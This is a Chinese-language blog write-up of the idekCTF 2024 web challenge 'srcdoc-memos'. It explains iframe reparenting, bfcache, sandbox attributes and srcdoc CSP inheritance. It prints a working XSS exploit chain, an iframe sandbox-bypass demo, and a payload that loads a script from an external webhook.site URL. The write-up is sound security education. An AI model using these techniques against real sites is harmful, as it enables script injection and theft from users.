---
来源: https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/
类型: html
获取日期: 2026-06-29
---

idekCTF 2024 筆記之 iframe 高級魔法 - Huli's blog


window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-1393J2EVCZ');


if (localStorage.getItem('dark-mode')) {
if (localStorage.getItem('dark-mode') === 'true') {
document.body.classList.add('dark-mode')
}
} else {
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
document.body.classList.add('dark-mode')
}
}


[Huli's blog](/)

[文章列表](/archives)
[隨意聊](/notes)
[分類](/categories)
[關於我](/about)

目錄

[1  **srcdoc-memos**](#srcdoc-memos)


---

[2  **困難點**](#困難點)


---

[3  **解法**](#解法)
[3.1  1. iframe 的 navigation](#1-iframe-的-navigation)
[3.2  2. iframe reparenting 與 bfcache](#2-iframe-reparenting-與-bfcache)
[3.3  3. CSP 的繼承](#3-csp-的繼承)
[3.4  全部加在一起](#全部加在一起)


---

[4  **總結**](#總結)


[English](/2024/09/07/en/idek-ctf-2024-iframe/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。

# idekCTF 2024 筆記之 iframe 高級魔法

2024年9月7日


[Security](/categories/Security/)

在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。

由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。

## srcdoc-memos

題目連結：<https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos>

這題的程式碼如下，目標是達成 XSS 偷到預先設置好的 flag：

```
const escape = html => html
  .replaceAll('"', "&quot;")
  .replaceAll("<", "&lt;")
  .replaceAll(">", "&gt;");

const handler = (req, res) => {
  const url = new URL(req.url, "http://localhost");
  let memo;

  switch (url.pathname) {
  case "/":
    memo =
      cookie.parse(req.headers.cookie || "").memo ??
      `<h2>Welcome to srcdoc memos!</h2>\n<p>HTML is supported</p>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(`
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>

<h1>srcdoc memos</h1>
<div class="horizontal">
  <iframe srcdoc="${escape(memo)}"></iframe>
  <textarea name="memo" placeholder="<b>TODO</b>: ..." form="update">${escape(memo)}</textarea>
</div>
<form id="update" action="/memo">
  <input type="submit" value="update memo">
</form>
    `.trim());
    break;

  case "/memo":
    memo = url.searchParams.get("memo") ?? "";
    res.statusCode = 302;
    res.setHeader("Set-Cookie", cookie.serialize("memo", memo));
    res.setHeader("Location", "/");
    res.end();
    break;

  default:
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("not found");
  }
};
```

其實題目本身的功能滿簡單，就是有一個 `/memo?memo=xxx` 的 API 可以設置 cookie，接著在訪問 index 的時候，會把內容放到 `srcdoc` 去，但最重要的是同個頁面上有一段 script：

```
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>
```

主要會做兩件事情：

1. 加上 script-src none 的 CSP
2. 如果有 opener，就把內容移除掉

## 困難點

先別管 opener 那個，那個比較好解決，難的是 CSP。

看完題目之後我的思考過程是這樣的，由於 `<iframe srcdoc>` 的 CSP 會繼承它的 parent，因此上層有的話，下層一定有，所以要想辦法把那個 CSP 弄掉，那既然要弄掉，我唯一能想到的就是透過 `<iframe csp>` 屬性先加上 CSP，就能阻止那段 script 的載入。

但由於這一題的內容是透過 cookie 帶入，所以會有 same-site cookie 的限制，在我們的 origin 是沒辦法插入 iframe 的，cookie 會有問題，因此一定要在題目的 origin 使用 `<iframe csp>`，除了這個以外，我想不到任何方式可以把 CSP 拿掉。

## 解法

之所以會說 opener 比較好解決，是因為之前就有看過類似的題目。

要如何讓 opener 是 null 有幾個方法，第一個類似於 [SekaiCTF 2022 - Obligatory Calc](https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/#obligatory-calc) 中所出現過的，執行 `window.open` 之後就快速關閉自己，`opener` 就會是 null，這題的作者 icesfont 用的就是這個方法（如果是在 console 上測試，會發現執行以後什麼都不會發生，因為瀏覽器預設不能在沒有動作下就開啟新的 window，所以第二個 open 會被擋住）：

```
function openNoOpener(url, name) {
  open(URL.createObjectURL(new Blob([`
    <script>
      open("${url}", "${name}");
      window.close();
    <\/script>
  `], { type: "text/html" })));
}
```

第二個方法我是在 Discord 裡面看到 Jazzy 提的，其實只要 open 之後自己把 opener 設成 null 就好：

```
function openNoOpener(url, name) {
  let w = window.open(url, name)
  w.opener = null
}
```

之所以可以這樣，是因為剛開啟之後會有一小段時間，開啟的 window 跟當前 window 是 same-origin，所以這一段時間是可以操作它的，接著才會被導到要前往的 URL。

雖然失去了 opener，表面上看起來跟開啟後的 window 脫節了，但其實利用 name 屬性就能夠再次存取到它，這點我以前有寫過：[iframe 與 window.open 黑魔法](https://blog.huli.tw/2022/04/07/iframe-and-window-open/#windowopen)。

解決了 opener 的問題以後，就可以來看另一個最麻煩的地方，就是那一段 script，如果能讓它不執行，那很輕鬆就能做到 XSS。但要怎麼讓它不執行呢？以前有[寫過](https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp) iframe 上有個屬性叫做 csp，加上它之後就可以設置 CSP。

如同前面所說的，因為 same-site cookie，因此要直接利用題目的 memo 功能嵌入，程式碼如下（修改自 Jazzy 在 Discord 中提供的 payload）：

```
<script>
  const challengeHost = 'http://localhost:1337'
  function openNoOpener(url, name) {
    let w = window.open(url, name)
    w.opener = null
  }

  let html = `
    html
    <script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1"><\/script>
    <iframe csp="script-src http: https:" src="/"></iframe>
  `;

  openNoOpener(`${challengeHost}/memo?memo=${encodeURIComponent(html)}`, 'main');
</script>
```

利用 CSP 不讓 inline script 執行，然後再載入一次網頁，就會執行原本準備好的 script。不過我實際試了一下，現在最新版會有錯誤：

> Refused to display ‘<http://localhost:1337/>‘ in a frame. The embedder requires it to enforce the following Content Security Policy: ‘script-src http: https:’. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.

如果頁面原本沒有 csp 的話，是沒辦法硬要加上去的。從賽後討論看起來比較舊版的 Chrome 對於 same-origin 的 csp 似乎限制沒這麼嚴格，因此只有在舊版可以（不過我也不確定就是了，我懶得找舊版來試了）。

接著講一下預期解，預期解牽涉到了很多 iframe 相關的知識，我陸續花了大概一週才真的理解到底預期解為什麼可以 work，為了方便理解，我把它拆成幾個小部分，順著看完應該就可以理解最後的預期解了。

### 1. iframe 的 navigation

由於 iframe 是一個獨立的 window，因此 iframe 本身當然也可以做 navigation，導去其他的地方。假設在網頁上有一個 iframe，原本的 src 是 A，接著你把 src 改成 B，此時如果按下上一頁（或是執行 `history.back()`），會發生什麼事情呢？有兩個可能性：

1. 整個網頁（top level）回到上一頁
2. iframe 回到上一頁（從 B 回到 A）

答案是 2，也就是說，當你在做 navigation 的時候，iframe 的紀錄也會被加進整體的 history 裡面。

知道這個前提之後，就可以來看一個狀況：

```
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
</body>
<script>
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

1. 先把 iframe 載入 test1，並且加上 sandbox，因此 script 不會執行
2. 按下 loadTest2 按鈕，把 iframe sandbox 拿掉，導去 test2，因此 script 會執行

此時如果按下 back 按鈕，理所當然的 iframe 會回到 test1，但是 sandbox 可能會有兩種狀況：

1. sandbox 也一起回到載入 test1 時的狀況
2. sandbox 維持現在的屬性，也就是沒有 sandbox

答案會是 2，sandbox 的屬性不會變，因此按下 back 之後，sandbox 沒了，test1 的 script 現在就可以執行了。

其實感覺也滿合理的，畢竟你只是改動 src 而已，沒有動 sandbox，因此 sandbox 維持在最新的狀態。

### 2. iframe reparenting 與 bfcache

剛剛的狀況是更改 sandbox 並且載入新的 src 之後，回到上一頁。接下來我們再來看另一個狀況，前半段相同，但載入新的 src 之後，我們不直接回到上一頁，而是先把整個網頁跳轉到其他頁面，接著才回去：

```
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

測試流程是：

1. 等待 iframe 載入完畢，會在畫面上看到 test1，此時因為有 sandbox，所以 script 不會執行
2. 按下 load test2 按鈕，把 sandbox 移除，載入 test2，script 被執行
3. 按下 top level navigation，把網頁跳去其他地方
4. 按下瀏覽器上的上一頁

那按完上一頁之後，預期狀況會是什麼？會根據有沒有 bfcache，出現兩種結果，先看有 bfcache 的。

如果有 bfcache 的話，按完上一頁就會是剛剛一樣的狀態，可以觀察到：

1. console 沒有出現 run，代表 script 不會重新被執行
2. iframe 的 src 是 test2
3. test2 的隨機數跟剛剛一樣，代表 iframe 中的 script 也沒有重新被執行

畢竟叫做 bfcache 嘛，所以會完整保留剛剛的狀態，不會重新載入一次網頁。

那如果沒有 bfcache 呢？照理來說網頁應該要重新載入一次才對，所以預期的狀況會是最剛開始的樣子：

```
<iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
```

也就是一個 sandbox 的 iframe 載入 test1。

但如果實際按下上一頁，會發現結果是既不是一開始的 sandbox + test1，也不是剛才的 no sandbox + test2，而是兩者的混合體：sandbox + test2。

換句話說，sandbox 屬性維持了頁面最新的狀態，是有的，但是 iframe 的 src 卻不是最新的，而是留在歷史紀錄裡的 test2，兩者結合起來，就變成了 sandbox 的 test2。

這個「回到上一頁時，iframe 的 src 回到上次的內容」的機制，就叫做 iframe reparenting，似乎沒有對應的 spec 完整描述，而且各個瀏覽器的實作也都不太一樣。

這個行為大概就是：「我歷史紀錄裡有個被 iframe 載入的 page，現在你按了上一頁，為了增進使用者體驗，我要把這個 page 直接放回到 iframe 中」，但弔詭的是屬性卻不是沿用上次的，而是直接用了當前頁面的。

如果我們把流程反過來做，就是一種 iframe 的 sandbox bypass：

```
<body>
  <iframe id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.setAttribute('sandbox', '')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

我們先載入了安全的 test1，並且沒有 sandbox 屬性，接著我們想載入邪惡的 test2，因此加上了 sandbox 屬性，覺得這樣就沒問題了。

但殊不知如果你把網頁導去其他地方，回到上一頁之後，就會出現沒有 sandbox 的 test2。

總而言之呢，要記住的是，當你回到上一頁時：

1. sandbox 屬性永遠跟著最新的頁面
2. src 會是上一次最後載入的網頁

2025-10-10 更新：

Chrome 在 2025 年 9 月做了一個變更：[Enabling bfcache for Cache-Control: no-store](https://developer.chrome.com/docs/web-platform/bfcache-ccns)，就算禁用 HTTP 快取也依然開啟 bfcache，導致上面的測試會失敗。

但只要依照文章內所說的，隨便建立一個 websocket 連線讓 bfcache 失效即可：

```
<body>
  <iframe id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  // to disable bfcache
  const ws = new WebSocket('ws://example.com');
  console.log('run')
  function loadTest2() {
    f.setAttribute('sandbox', '')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

### 3. CSP 的繼承

如果是用 iframe src 的話，由於就是嵌入了另一個獨立的網頁，因此兩個網頁之間的 CSP 沒有任何關聯，不會互相影響。但如果是用 srcdoc 的話，就有繼承關係了。

以底下的程式碼為例：

```
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
</head>
<body>
    <iframe srcdoc="Test:<script>document.writeln(Math.random())</script>"></iframe>
    <a href="a.html">top level navigation</a>
</body>
<script>
    console.log('run')
</script>
```

由於有著 `script-src 'none'` 的 CSP，因此頁面上的 script 不會執行，然後 srcdoc 裡的 script 也不會執行，因為通常 iframe srcdoc 的 CSP 會繼承它的 parent，聽起來也很合理。

那接下來我們來試跟剛剛類似的事情：

1. 確認頁面上有 CSP
2. 確認 srcdoc 的 script 無法執行
3. 按下 top level navigation，去到別的頁面
4. 更新檔案，把 head 裡的 CSP 刪掉（你要自己手動做）
5. 按下上一頁

一樣假設在沒有 bfcache 的狀況下，當我又回到這個網頁時，會是什麼狀況？預期中的行為應該是：「就跟第一次載入一樣」，因此頁面上的 script 跟 srcdoc 裡的 script 都沒有 CSP，都可以執行程式碼。

但答案是：

1. 頁面上確實沒有 CSP，所以 script 可以執行，有印出 run
2. 但是 srcdoc 的 script 卻被 CSP 擋住了，無法執行

也就是說，此時 iframe srcdoc 的 CSP 並不是繼承於當前頁面，而是繼承於 history 裡的結果，才會發生這種狀況。

用專有名詞來說的話，叫做 session history 以及 policy container，iframe 的 CSP 來自於 policy container，而這個 policy container 的儲存結果又與 session history 有關，但因為這兩個專有名詞我都沒有深入研究，因此就不多提了。

### 全部加在一起

綜合以上的幾點結果，我們知道了幾件事情，當你回到上一頁時：

1. sandbox 屬性永遠跟著最新的頁面
2. src 會是上一次最後載入的網頁
3. srcdoc 的 CSP 會繼承上次的結果

sandbox 的行為很顯然跟另外兩者不同，就只有它跟著最新的頁面，其他兩個都跟著上次的結果。

接著回顧一下題目的核心程式碼（檢查 opener 那個我先拿掉了，這樣比較好理解核心概念）：

```
res.end(`
  <script>
  document.head.insertAdjacentHTML(
    "beforeend",
    \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
  );
  </script>
  <iframe srcdoc="${escape(memo)}"></iframe>
`.trim());
```

第一步，我們先載入一個 sandbox iframe，src 會是我們的 XSS payload：

```
const challengeHost = 'http://localhost:1337'

const xssPayload = `<script>alert(1)<\/script>`
const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=${xssPayload}">`
const win = window.open(`${challengeHost}/memo?memo=` + payload)
```

此時這個 win 的內容就會是：

```
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
  <iframe srcdoc='
    <iframe
      sandbox="allow-same-origin"
      src="/memo?memo=<script>alert(1)</script>">
    </iframe>
  '>
  </iframe>
</body>
```

如果更放大一點來看那個 sandbox iframe 的話，這個 iframe 裡面的內容是：

```
<head></head> <!-- 空的 head，沒有 CSP -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

由於 sandbox 的緣故，因此 script 不會執行，所以不會有 CSP。但也因為 sandbox，所以 srcdoc 裡的 script 也同樣不會執行。

接著我們把網頁跳到其他頁面，然後開啟 `/memo?memo=<iframe></iframe>`，這時候 cookie 中的內容會被取代掉。

再利用 `history.back()` 回去，此時如同前面所講的，網頁會重新載入，因此網頁的 HTML 變成：

```
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
    <iframe srcdoc='
        <iframe></iframe>
    '>
    </iframe>
</body>
```

雖然看起來是空的，但因為之前講過的 reparenting 行為，因此那個空的 iframe 的內容，會是上次的 `/memo?memo=<script>alert(1)</script>`。

接著，又因為之前講過的：「sandbox 屬性永遠跟著現在的頁面」的特性，現在這個 iframe 的 sandbox 沒了。既然 sandbox 沒了，那內容就變成：

```
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

原本 CSP 是空的，但因為 sandbox 不見了，所以現在又回來了。

但是呢，最後也是最重要的一點，前面提過的：「srcdoc 的 CSP 會繼承上次的結果」，因此這個 srcdoc 的 CSP 與當前頁面無關，而是繼承上次的，而上次的 CSP 是什麼？是空的，因此 script 就可以執行了，順利達成 XSS。

把題目的 opener 檢查拿掉之後，exploit 會簡單很多，比較好理解：

```
<script>
  const challengeHost = 'http://localhost:1337'

  const xssPayload = `<script>alert(document.domain)<\/script>`
  const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=${xssPayload}">`
  const win = window.open(`${challengeHost}/memo?memo=` + payload)

  setTimeout(() => {
    const win2 = window.open(`${challengeHost}/memo?memo=<iframe></iframe>`)
    setTimeout(() => {
      win2.close()
      win.location = URL.createObjectURL(new Blob([`
        <script>
          setTimeout(() => {
           history.back();
          }, 500);
        <\/script>
      `], { type: "text/html" }));
    }, 1000)
  }, 1000)
</script>
```

以上就是這題的解法，主要是靠著回到上一頁時，載入 sandbox 與 CSP 兩者的來源不同，藉此創造出差異，達成 XSS。

## 總結

根據作者的說法，這一題的靈感來源是這個 issue：[srcdoc and sandbox interaction with session history #6809](https://github.com/whatwg/html/issues/6809)，而寫這篇的時候我也是看了這個 issue 好幾遍，自己做實驗很多次，才終於搞懂箇中奧妙，重點是看完之後要自己動手試試看，多試幾次大概就會知道是怎麼一回事了。

話說這個 issue 的作者 Jake Archibald，就是 [HTTP 203](https://www.youtube.com/playlist?list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9) 的主持人，這個節目對前端工程師來說應該不陌生，會講到很多與 Web 相關的議題，而有篇前端工程師的必讀經典之一：[Tasks, microtasks, queues and schedules](https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/) 也是他寫的。

[#Security](/tags/Security/)

[HITCON CTF & corCTF & sekaiCTF 2024 筆記](/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/)

[GoogleCTF 2024 筆記](/2024/06/28/google-ctf-2024-writeup/)

### 評論

© 2026 Huli 
Powered by [Hexo](http://hexo.io/) & [Minos](https://github.com/ppoffice/hexo-theme-minos)

[GitHub](https://github.com/ppoffice/hexo-theme-minos "GitHub")

繁體中文

[English](/2024/09/07/en/idek-ctf-2024-iframe/)


(function ($) {
$(document).ready(function () {
if (typeof($.fn.lightGallery) === 'function') {
$('.article.gallery').lightGallery({ selector: '.gallery-item' });
}
});
})(jQuery);


.hljs {
position: relative;
}
.hljs .clipboard-btn {
float: right;
color: #9a9a9a;
background: none;
border: none;
cursor: pointer;
}
.hljs .clipboard-btn:hover {
color: #8a8a8a;
}
.hljs > .clipboard-btn {
display: none;
position: absolute;
right: 4px;
top: 4px;
}
.hljs:hover > .clipboard-btn {
display: inline;
}
.hljs > figcaption > .clipboard-btn {
margin-right: 4px;
}

$(document).ready(function () {
$('figure.hljs').each(function(i, figure) {
var codeId = 'code-' + i;
var code = figure.querySelector('.code');
var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
code.id = codeId;
copyButton.addClass('clipboard-btn');
copyButton.attr('data-clipboard-target-id', codeId);
var figcaption = figure.querySelector('figcaption');
if (figcaption) {
figcaption.append(copyButton[0]);
} else {
figure.prepend(copyButton[0]);
}
})
var clipboard = new ClipboardJS('.clipboard-btn', {
target: function(trigger) {
return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
}
});
clipboard.on('success', function(e) {
e.clearSelection();
})
})